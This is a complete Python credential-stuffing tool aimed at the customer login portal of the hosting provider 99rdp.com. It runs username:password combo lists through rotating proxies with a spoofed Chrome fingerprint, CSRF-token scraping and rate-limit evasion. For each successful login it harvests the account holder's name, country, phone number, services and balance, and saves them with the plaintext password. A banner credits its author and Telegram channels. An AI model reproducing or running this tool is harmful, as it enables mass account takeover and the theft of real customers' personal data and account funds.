import sys, os, re, time, random, threading
from queue import Queue, Empty
from collections import deque
from concurrent.futures import ThreadPoolExecutor

try:
    from curl_cffi import requests as cffi_requests
except ImportError:
    print("pip install curl_cffi")
    sys.exit(1)


UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0")

BASE_URL   = "https://portal.99rdp.com"
LOGIN_URL  = BASE_URL + "/login"
DETAIL_URL = BASE_URL + "/clientarea.php?action=details"

KEY_SUCCESS = "My Dashboard"
KEY_FAILURE = "Login Details Incorrect. Please try again."

PROXY_TEST_URLS = [
    "https://api.ipify.org?format=json",
    "https://httpbin.org/ip",
]

PROXY_TEST_TIMEOUT = 12
PROXY_TEST_THREADS = 40

PER_PROXY_MAX_USES  = 6
PER_PROXY_WINDOW    = 60
RATE_LIMIT_COOLDOWN = 120
JITTER_MIN          = 0.8
JITTER_MAX          = 2.5
CHECK_THREADS       = 10

RL_BACKOFF_BASE   = 15
RL_BACKOFF_MAX    = 180
RL_MAX_RETRIES    = 4
SECOND_PASS_DELAY = 60

OUT_TXT_DEFAULT   = "99rdp_hits.txt"
PROXY_LIVE_SUFFIX = "_live.txt"


class C:
    R  = "\033[0m";  B  = "\033[1m";  D  = "\033[90m"
    CY = "\033[96m"; GR = "\033[92m"; YE = "\033[93m"
    RE = "\033[91m"; MA = "\033[95m"; WH = "\033[97m"
    BL = "\033[94m"; GY = "\033[37m"

def tty():
    try: return sys.stdout.isatty()
    except Exception: return False

USE_COLOR = tty()
def col(code, s): return (code + s + C.R) if USE_COLOR else s
def clear_line():
    sys.stdout.write("\r\033[K" if USE_COLOR else "\r")

def bar(cur, total, width=22):
    if total <= 0: return "[" + (" " * width) + "]"
    cur = min(cur, total)
    filled = max(0, min(width, int(width * cur / total)))
    return "[%s%s]" % ("█" * filled, "░" * (width - filled))


GET_HEADERS = {
    "User-Agent": UA,
    "Pragma": "no-cache",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
}

POST_HEADERS = {
    "Host": "portal.99rdp.com",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Cache-Control": "max-age=0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://portal.99rdp.com",
    "Priority": "u=0, i",
    "Referer": LOGIN_URL,
    "Sec-Ch-Ua": '"Not=A?Brand";v="99", "Microsoft Edge";v="151", "Chromium";v="151"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": UA,
    "Connection": "keep-alive",
}


hits_lock    = threading.Lock()
counter_lock = threading.Lock()
print_lock   = threading.Lock()
proxy_lock   = threading.Lock()
err_lock     = threading.Lock()

counters = {"checked": 0, "hits": 0, "fails": 0, "errors": 0,
            "retries": 0, "ratelimit": 0}

err_reasons = deque(maxlen=5)
err_counts  = {}

hits_file     = None
proxy_state   = {}
proxy_penalty = {}
hits_records  = []
hits_meta     = {"proxies": 0, "total": 0}


def note_error(reason):
    reason = (reason or "?").strip()[:80]
    with err_lock:
        err_counts[reason] = err_counts.get(reason, 0) + 1
        if reason not in err_reasons:
            err_reasons.append(reason)


def err_summary():
    with err_lock:
        if not err_reasons: return ""
        return "  ·  ".join(
            "%s×%d" % (r[:28], err_counts.get(r, 0))
            for r in list(err_reasons)[-3:])



def normalize_proxy(raw):
    raw = raw.strip()
    if not raw or raw.startswith("#"): return None
    if re.match(r'^(https?|socks5h?|socks4a?)://', raw):
        m = re.match(
            r'^(?P<scheme>https?|socks5h?|socks4a?)://'
            r'(?P<host>[^:/@]+):(?P<port>\d+)'
            r':(?P<user>[^:@]+):(?P<pw>.+)$', raw)
        if m:
            return "%s://%s:%s@%s:%s" % (
                m.group("scheme"), m.group("user"),
                m.group("pw"), m.group("host"), m.group("port"))
        return raw
    m = re.match(r'^(?P<host>[^:/@]+):(?P<port>\d+):(?P<user>[^:@]+):(?P<pw>.+)$', raw)
    if m:
        return "http://%s:%s@%s:%s" % (m.group("user"), m.group("pw"),
                                       m.group("host"), m.group("port"))
    m = re.match(r'^(?P<host>[^:/@]+):(?P<port>\d+)$', raw)
    if m: return "http://%s:%s" % (m.group("host"), m.group("port"))
    if "@" in raw and "://" not in raw: return "http://" + raw
    return None


def load_proxies(path):
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            p = normalize_proxy(ln)
            if p: out.append(p)
    return out


def test_proxy(proxy):
    proxies = {"http": proxy, "https": proxy}
    last_err = ""
    for url in PROXY_TEST_URLS:
        t0 = time.time()
        try:
            r = cffi_requests.get(url, proxies=proxies, impersonate="chrome146",
                                  timeout=PROXY_TEST_TIMEOUT,
                                  headers={"User-Agent": UA, "Accept": "application/json, */*"})
            dt = time.time() - t0
            if r.status_code != 200:
                last_err = "http %d" % r.status_code; continue
            try:
                j = r.json()
                ip = j.get("ip", "") or j.get("origin", "")
            except Exception:
                ip = (r.text or "").strip()[:64]
            return {"proxy": proxy, "ok": True, "latency": round(dt, 2), "ip": ip}
        except Exception as e:
            last_err = str(e)[:80]; continue
    return {"proxy": proxy, "ok": False, "err": last_err}


def run_proxy_test(plist, threads=PROXY_TEST_THREADS):
    if not plist: return []
    total = len(plist)
    print()
    print(col(C.CY + C.B, "  ── step 1 · proxy check ─────────────────────────────────────"))
    print(col(C.D, "    %d proxies  ·  %d threads" % (total, threads)))
    print()

    q = Queue()
    for p in plist: q.put(p)
    live = []; dead = 0; done = 0
    live_lock = threading.Lock()

    def worker():
        nonlocal dead, done
        while True:
            try: p = q.get(timeout=2)
            except Empty: return
            res = test_proxy(p)
            with live_lock:
                done += 1
                if res.get("ok"):
                    live.append(res)
                    tag = col(C.GR, "  ✓  ")
                    sys.stdout.write("\r\033[K%s%-52s  %5.2fs  ip=%s\n"
                                     % (tag, p[:52], res["latency"], res.get("ip", "")[:20]))
                else:
                    dead += 1
                    tag = col(C.RE, "  ✗  ")
                    sys.stdout.write("\r\033[K%s%-52s  %s\n"
                                     % (tag, p[:52], res.get("err", "")[:36]))
            with print_lock:
                clear_line()
                sys.stdout.write("     %s  done %d/%d  live %s  dead %s"
                                 % (col(C.CY, bar(done, total)), done, total,
                                    col(C.GR, str(len(live))), col(C.RE, str(dead))))
                sys.stdout.flush()

    with ThreadPoolExecutor(max_workers=threads) as ex:
        for f in [ex.submit(worker) for _ in range(threads)]:
            f.result()
    print(); print()
    live.sort(key=lambda r: r["latency"])
    return live


def proxy_ready(p):
    now = time.time()
    if proxy_penalty.get(p, 0) > now: return False
    rec = proxy_state.get(p)
    if rec is None: return True
    start, count = rec
    if now - start > PER_PROXY_WINDOW: return True
    return count < PER_PROXY_MAX_USES


def consume_proxy(p):
    now = time.time()
    with proxy_lock:
        rec = proxy_state.get(p)
        if rec is None or now - rec[0] > PER_PROXY_WINDOW:
            proxy_state[p] = [now, 1]
        else:
            proxy_state[p][1] += 1


def penalize_proxy(p, seconds=RATE_LIMIT_COOLDOWN):
    with proxy_lock:
        proxy_penalty[p] = time.time() + seconds


def pick_proxy(proxies, timeout=90):
    if not proxies: return None
    t0 = time.time()
    while time.time() - t0 < timeout:
        avail = [p for p in proxies if proxy_ready(p)]
        if avail:
            p = random.choice(avail); consume_proxy(p); return p
        time.sleep(0.5)
    best = min(proxies, key=lambda x: proxy_penalty.get(x, 0))
    consume_proxy(best); return best


TOKEN_RE = re.compile(
    r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']token["\'][^>]*value=["\']([^"\']+)',
    re.IGNORECASE)
TOKEN_RE_ALT = re.compile(
    r'<input[^>]*name=["\']token["\'][^>]*value=["\']([^"\']+)',
    re.IGNORECASE)


def _clean_text(s):
    if not s: return ""
    s = re.sub(r"<[^>]+>", " ", s)
    s = re.sub(r"&nbsp;", " ", s)
    s = re.sub(r"&amp;",  "&", s)
    s = re.sub(r"\s+", " ", s)
    return s.strip()


def _input_value(html, field):
    if not html: return ""
    for m in re.finditer(r'<input\b[^>]*>', html, re.I):
        tag = m.group(0)
        if re.search(r'\bname\s*=\s*["\']' + re.escape(field) + r'["\']', tag, re.I):
            v = re.search(r'\bvalue\s*=\s*["\']([^"\']*)["\']', tag, re.I)
            return (v.group(1) if v else "").strip()
    return ""


def _selected_option(html, select_name):
    if not html: return ""
    m = re.search(
        r'<select\b[^>]*\bname\s*=\s*["\']' + re.escape(select_name) + r'["\'][^>]*>'
        r'(.*?)</select>',
        html, re.I | re.S)
    if not m: return ""
    body = m.group(1)
    sel = re.search(r'<option\b[^>]*\bselected\b[^>]*>([^<]+)</option>',
                    body, re.I)
    if sel: return _clean_text(sel.group(1))
    return ""


_BALANCE_NUM = r'([0-9]+(?:[.,][0-9]{2})?)'
_BALANCE_CUR = r'(?:([A-Z]{3}))?'

BALANCE_PREFIX_RE = re.compile(
    r'balance[^<]{0,60}?\$\s*' + _BALANCE_NUM + r'\s*' + _BALANCE_CUR,
    re.I)
BALANCE_H3_RE = re.compile(
    r'<h[1-6][^>]*>\s*\$\s*' + _BALANCE_NUM + r'\s*' + _BALANCE_CUR +
    r'\s*</h[1-6]>.{0,180}?balance',
    re.I | re.S)
BALANCE_H3_REV_RE = re.compile(
    r'balance.{0,180}?<h[1-6][^>]*>\s*\$\s*' + _BALANCE_NUM + r'\s*' +
    _BALANCE_CUR + r'\s*</h[1-6]>',
    re.I | re.S)
BALANCE_DIV_RE = re.compile(
    r'(?:account\s+)?balance[^<]{0,40}?</[^>]+>\s*'
    r'<[^>]+>\s*\$\s*' + _BALANCE_NUM + r'\s*' + _BALANCE_CUR,
    re.I | re.S)


def _parse_balance(html):
    if not html: return ""
    for rx in (BALANCE_H3_RE, BALANCE_H3_REV_RE, BALANCE_DIV_RE, BALANCE_PREFIX_RE):
        m = rx.search(html)
        if m:
            num = m.group(1).replace(",", ".")
            cur = (m.group(2) or "").strip()
            return ("$%s %s" % (num, cur)).strip() if cur else ("$" + num)
    return ""


SERVICES_H3_RE = re.compile(
    r'<h[1-6][^>]*>\s*(\d+)\s*</h[1-6]>\s*(?:<[^>]+>\s*){0,4}active\s+services',
    re.I | re.S)
SERVICES_TEXT_RE = re.compile(r'(\d+)\s*active\s+services?', re.I)


def _parse_services(html):
    if not html: return ""
    m = SERVICES_H3_RE.search(html) or SERVICES_TEXT_RE.search(html)
    return m.group(1) if m else ""


def _parse_name(html):
    if not html: return ""
    first = _input_value(html, "firstname")
    last  = _input_value(html, "lastname")
    full  = ("%s %s" % (first, last)).strip()
    if full: return full[:80]
    return _input_value(html, "fullname")[:80]


def _parse_country(html):
    if not html: return ""
    c = _selected_option(html, "country")
    if c: return c[:40]
    m = re.search(
        r'>\s*(?:country|country/region)\s*<.*?<(?:td|span|div)[^>]*>\s*([^<]+?)\s*<',
        html, re.I | re.S)
    if m:
        v = _clean_text(m.group(1))
        if v and len(v) < 60: return v[:40]
    return ""


def _parse_phone(html):
    if not html: return ""
    for f in ("phonenumber", "phone", "telephone"):
        v = _input_value(html, f)
        if v: return v[:32]
    return ""


def _session(proxy=None):
    s = cffi_requests.Session(impersonate="chrome146")
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


def try_login(username, password, proxy=None):
    captured = {}
    intel = {}

    try:
        s = _session(proxy)

        r1 = s.get(LOGIN_URL, headers=GET_HEADERS, timeout=20, allow_redirects=True)
        if not r1.text:
            note_error("empty login page")
            return "ERROR", "empty login page", {}, {}

        m = TOKEN_RE.search(r1.text) or TOKEN_RE_ALT.search(r1.text)
        if not m:
            note_error("no csrf token")
            return "ERROR", "no csrf token", {}, {}

        csrf = m.group(1)

        body = "token=%s&username=%s&password=%s" % (
            cffi_requests.utils.quote(csrf, safe=""),
            cffi_requests.utils.quote(username, safe=""),
            cffi_requests.utils.quote(password, safe=""),
        )

        r2 = s.post(LOGIN_URL, data=body, headers=POST_HEADERS,
                    timeout=25, allow_redirects=True)

        text = r2.text or ""
        low  = text.lower()

        if ("too many" in low or "rate limit" in low or
            "please try again later" in low or
            r2.status_code in (429, 503)):
            return "RATE_LIMIT", "http %d" % r2.status_code, {}, {}

        if KEY_SUCCESS in text:
            captured["balance"]  = _parse_balance(text)
            captured["services"] = _parse_services(text)

            try:
                r3 = s.get(DETAIL_URL, headers=GET_HEADERS, timeout=20,
                           allow_redirects=True)
                if r3.text:
                    intel["name"]    = _parse_name(r3.text)
                    intel["country"] = _parse_country(r3.text)
                    intel["phone"]   = _parse_phone(r3.text)
            except Exception as e:
                note_error("details: " + str(e)[:40])

            return "HIT", "valid · 99rdp panel", captured, intel

        if KEY_FAILURE in text:
            return "FAIL", "wrong credentials", {}, {}

        snippet = re.sub(r"\s+", " ", _clean_text(text)[:80])
        note_error("unexpected: " + snippet[:50])
        return "FAIL", "unexpected response", {}, {}

    except Exception as e:
        err = str(e)[:100]
        low = err.lower()
        if any(k in low for k in ("proxy", "connect", "ssl", "tunnel", "timeout")):
            note_error("net: " + err[:50])
            return "ERROR", "proxy: " + err, {}, {}
        note_error("exc: " + err[:50])
        return "ERROR", err, {}, {}


def _write_hits_file(path):
    total  = len(hits_records)
    ts_hdr = time.strftime("%Y-%m-%d %H:%M UTC", time.gmtime())
    W = 72
    line = "═" * W
    header = [
        " 99rdp.com Hits  ·  99rdp_checker",
        " generated %s" % ts_hdr,
        " %d hits  ·  %d checked  ·  %d proxies" % (
            total, counters["checked"], hits_meta.get("proxies", 0)),
    ]
    with open(path, "w", encoding="utf-8") as f:
        f.write(line + "\n")
        for h in header: f.write(h.ljust(W) + "\n")
        f.write(line + "\n")
        for i, r in enumerate(hits_records, 1):
            f.write("\n")
            f.write(" [%d]  %s\n" % (i, r["ts"]))
            f.write("      %-9s : %s\n" % ("login",    r["login"]))
            f.write("      %-9s : %s\n" % ("pass",     r["pass"]))
            if r["name"]:
                f.write("      %-9s : %s\n" % ("name",     r["name"]))
            if r["country"]:
                f.write("      %-9s : %s\n" % ("country",  r["country"]))
            if r["phone"]:
                f.write("      %-9s : %s\n" % ("phone",    r["phone"]))
            if r["services"]:
                f.write("      %-9s : %s\n" % ("services", r["services"]))
            if r["balance"]:
                f.write("      %-9s : %s\n" % ("balance",  r["balance"]))


def record_hit(path, login, password, name, country, phone, services, balance):
    rec = {
        "ts":       time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "login":    (login or "").replace("\n", " ").strip(),
        "pass":     (password or "").replace("\n", " ").strip(),
        "name":     (name or "").replace("\n", " ").strip(),
        "country":  (country or "").replace("\n", " ").strip(),
        "phone":    (phone or "").replace("\n", " ").strip(),
        "services": (services or "").replace("\n", " ").strip(),
        "balance":  (balance or "").replace("\n", " ").strip(),
    }
    with hits_lock:
        hits_records.append(rec)
        _write_hits_file(path)


def _vlen(s):
    return len(re.sub(r"\033\[[0-9;]*m", "", s or ""))


def render_hit_block(idx, login, password, name, country, phone, services, balance):
    INNER = 58
    border_top = "  ╭" + "─" * INNER + "╮"
    border_sep = "  ├" + "─" * INNER + "┤"
    border_bot = "  ╰" + "─" * INNER + "╯"
    title = "◆ HIT #%d" % idx
    title_line = "  │ " + col(C.GR + C.B, title) + (" " * max(0, INNER - 2 - _vlen(title))) + " │"

    def row(k, v, vcol):
        label = col(C.D, k.ljust(9))
        val   = v if v else col(C.D, "—")
        if v and vcol: val = col(vcol, v)
        pad = max(0, INNER - 3 - 9 - _vlen(val))
        return "  │ " + label + " " + val + (" " * pad) + " │"

    return "\n".join([
        border_top,
        title_line,
        border_sep,
        row("login",    login,    C.WH),
        row("pass",     password, C.YE),
        row("name",     name,     C.CY),
        row("country",  country,  C.CY),
        row("phone",    phone,    C.CY),
        row("services", services, C.MA),
        row("balance",  balance,  C.GR),
        border_bot,
    ])


def render_summary(data):
    W = 46
    plain = ["  │  %-14s : %s" % (k, v) for k, v in data]
    top = "  ╭─ summary " + "─" * (W - 11) + "╮"
    bot = "  ╰" + "─" * W + "╯"
    return "\n".join([top] + plain + [bot])


def _requeue_later(q, user, pw, attempts, delay):
    time.sleep(delay)
    q.put((user, pw, attempts + 1))


def draw_progress(total):
    with print_lock:
        clear_line()
        checked = counters["hits"] + counters["fails"] + counters["errors"]
        sys.stdout.write(
            "  %s  checked %d/%d  ·  hits %s  ·  fails %s  ·  rl %s  ·  err %s"
            % (col(C.CY, bar(checked, total)),
               checked, total,
               col(C.GR + C.B, str(counters["hits"])),
               col(C.RE, str(counters["fails"])),
               col(C.YE, str(counters["ratelimit"])),
               col(C.D,  str(counters["errors"]))))
        sys.stdout.flush()


def run_combo_check(combos, proxies, out_path, threads=CHECK_THREADS):
    global hits_file, hits_records
    hits_file = out_path
    hits_records = []
    _write_hits_file(hits_file)

    total = len(combos)
    print()
    print(col(C.CY + C.B, "  ── step 2 · combo check ─────────────────────────────────────"))
    print(col(C.D, "    %d combos  ·  %d threads  ·  %d proxies"
                   % (total, threads, len(proxies))))
    print()

    retry_queue = Queue()
    second_pass = []
    stop_event  = threading.Event()
    for u, p in combos: retry_queue.put((u, p, 0))

    t0 = time.time()

    def worker():
        while True:
            if stop_event.is_set(): return
            try: item = retry_queue.get(timeout=3)
            except Empty: return
            login, password, attempts = item

            proxy = pick_proxy(proxies) if proxies else None
            status, note, captured, intel = try_login(login, password, proxy)

            if status == "HIT":
                with counter_lock: counters["hits"] += 1
                hit_idx  = counters["hits"]
                name     = intel.get("name", "") or ""
                country  = intel.get("country", "") or ""
                phone    = intel.get("phone", "") or ""
                services = captured.get("services", "") or ""
                balance  = captured.get("balance", "") or ""
                record_hit(hits_file, login, password, name, country,
                           phone, services, balance)
                with print_lock:
                    clear_line()
                    sys.stdout.write("\n")
                    sys.stdout.write(render_hit_block(hit_idx, login, password,
                                                      name, country, phone,
                                                      services, balance) + "\n")
                    sys.stdout.flush()

            elif status == "RATE_LIMIT":
                with counter_lock: counters["ratelimit"] += 1
                if proxy: penalize_proxy(proxy, RATE_LIMIT_COOLDOWN)
                if attempts < RL_MAX_RETRIES:
                    backoff = min(RL_BACKOFF_BASE * (2 ** attempts), RL_BACKOFF_MAX)
                    delay   = backoff + random.uniform(0, 4)
                    threading.Thread(
                        target=lambda u=login, p=password, a=attempts, d=delay:
                            _requeue_later(retry_queue, u, p, a, d),
                        daemon=True).start()
                else:
                    with counter_lock: second_pass.append((login, password))

            elif status == "FAIL":
                with counter_lock: counters["fails"] += 1
            else:
                with counter_lock: counters["errors"] += 1

            draw_progress(total)
            time.sleep(random.uniform(JITTER_MIN, JITTER_MAX))

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(worker) for _ in range(threads)]
        try:
            for f in futs: f.result()
        except KeyboardInterrupt:
            print("\n" + col(C.YE, "  [!] Ctrl+C — stopping main pass"))
            stop_event.set()

    print(); print()

    if second_pass:
        run_second_pass(second_pass, proxies, out_path, threads=max(3, threads // 2))

    dt = time.time() - t0
    print(col(C.CY + C.B, "  ── done ────────────────────────────────────────────────────"))
    print()
    print(render_summary([
        ("elapsed",    "%.1fs" % dt),
        ("checked",    str(counters["checked"])),
        ("hits",       col(C.GR, str(counters["hits"]))),
        ("fails",      str(counters["fails"])),
        ("rate-limit", str(counters["ratelimit"])),
        ("errors",     str(counters["errors"])),
        ("hits file",  hits_file),
    ]))
    es = err_summary()
    if es:
        print(col(C.D, "  errors: " + es))
    print()


def run_second_pass(combos, proxies, out_path, threads):
    print(col(C.CY + C.B, "  ── step 3 · second pass (rate-limited) ──────────────────────"))
    print(col(C.D, "    %d items  ·  waiting %ds for cooldowns"
                   % (len(combos), SECOND_PASS_DELAY)))
    time.sleep(SECOND_PASS_DELAY)
    print(col(C.D, "    resuming…"))
    print()

    q = Queue()
    for u, p in combos: q.put((u, p, 0))
    stop_event = threading.Event()
    total = len(combos)

    def worker():
        while True:
            if stop_event.is_set(): return
            try: item = q.get(timeout=3)
            except Empty: return
            login, password, attempts = item

            proxy = pick_proxy(proxies) if proxies else None
            status, note, captured, intel = try_login(login, password, proxy)

            if status == "HIT":
                with counter_lock: counters["hits"] += 1
                hit_idx  = counters["hits"]
                name     = intel.get("name", "") or ""
                country  = intel.get("country", "") or ""
                phone    = intel.get("phone", "") or ""
                services = captured.get("services", "") or ""
                balance  = captured.get("balance", "") or ""
                record_hit(out_path, login, password, name, country,
                           phone, services, balance)
                with print_lock:
                    clear_line()
                    sys.stdout.write("\n")
                    sys.stdout.write(render_hit_block(hit_idx, login, password,
                                                      name, country, phone,
                                                      services, balance) + "\n")
                    sys.stdout.flush()

            elif status == "RATE_LIMIT":
                with counter_lock: counters["ratelimit"] += 1
                if proxy: penalize_proxy(proxy, RATE_LIMIT_COOLDOWN)
                if attempts < 3:
                    backoff = 30 * (attempts + 1) + random.uniform(0, 10)
                    threading.Thread(
                        target=lambda u=login, p=password, a=attempts, d=backoff:
                            _requeue_later(q, u, p, a, d),
                        daemon=True).start()

            elif status == "FAIL":
                with counter_lock: counters["fails"] += 1
            else:
                with counter_lock: counters["errors"] += 1

            draw_progress(total)
            time.sleep(random.uniform(JITTER_MIN, JITTER_MAX))

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(worker) for _ in range(threads)]
        try:
            for f in futs: f.result()
        except KeyboardInterrupt:
            print("\n" + col(C.YE, "  [!] Ctrl+C — stopping second pass"))
            stop_event.set()
    print(); print()


def ask(prompt, default=None):
    suffix = (" [%s]" % default) if default else ""
    try:
        val = input(col(C.B, "  ? ") + prompt + col(C.D, suffix) + " : ").strip()
    except EOFError:
        return default
    if not val and default is not None: return default
    return val


def ask_int(prompt, default):
    v = ask(prompt, str(default))
    try: return int(v)
    except Exception: return default


def ask_yes(prompt, default="y"):
    return ask(prompt + " (y/n)", default).lower().startswith("y")


def banner():
    W = 60
    l1 = "99rdp.com checker"
    l2 = "full capture"
    print()
    print(col(C.MA + C.B, "  ╔" + "═" * W + "╗"))
    print(col(C.MA + C.B, "  ║" + l1.center(W) + "║"))
    print(col(C.MA + C.B, "  ║" + l2.center(W) + "║"))
    print(col(C.MA + C.B, "  ╚" + "═" * W + "╝"))
    print()
    print("   " + col(C.D, "creator".ljust(9)) + col(C.CY + C.B, "@mr_crkz"))
    print("   " + col(C.D, "channel".ljust(9)) + col(C.BL, "https://t.me/+F4lGYLLn12o0N2Rh"))
    print("   " + col(C.D, "channel".ljust(9)) + col(C.BL, "https://t.me/professor_zal_projects"))
    print()


def main():
    banner()

    use_proxies = ask_yes("Use proxies?", "y")
    live_proxies = []

    if use_proxies:
        pfile = ask("Proxy file path", "proxies.txt")
        if not os.path.exists(pfile):
            print(col(C.RE, "  [!] not found: %s" % pfile)); return 1
        raw = load_proxies(pfile)
        print(col(C.D, "  ·  loaded %d proxies" % len(raw)))
        threads_t = ask_int("Test threads", PROXY_TEST_THREADS)
        live_res = run_proxy_test(raw, threads=threads_t)
        live_proxies = [r["proxy"] for r in live_res]

        out_live = os.path.splitext(pfile)[0] + PROXY_LIVE_SUFFIX
        with open(out_live, "w", encoding="utf-8") as f:
            for p in live_proxies: f.write(p + "\n")

        if live_proxies:
            print(col(C.GR, "  ✓ live proxies: %d" % len(live_proxies))
                  + col(C.D, "  →  " + out_live))
        else:
            print(col(C.RE, "  ✗ no live proxies — abort")); return 1

    cfile = ask("Combo file path", "combo.txt")
    if not os.path.exists(cfile):
        print(col(C.RE, "  [!] not found: %s" % cfile)); return 1

    combos = []
    with open(cfile, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            ln = ln.strip()
            if not ln or ln.startswith("#"): continue
            for sep in (":", "|", ";"):
                if sep in ln:
                    u, p = ln.split(sep, 1)
                    combos.append((u.strip(), p.strip())); break
    if not combos:
        print(col(C.RE, "  [!] no combos")); return 1
    print(col(C.D, "  ·  loaded %d combos" % len(combos)))

    out_txt   = ask("Output txt path", OUT_TXT_DEFAULT)
    threads_c = ask_int("Check threads", CHECK_THREADS)

    hits_meta["proxies"] = len(live_proxies)
    hits_meta["total"]   = len(combos)

    run_combo_check(combos, live_proxies, out_txt, threads=threads_c)
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n" + col(C.YE, "  [!] aborted by user"))
        sys.exit(130)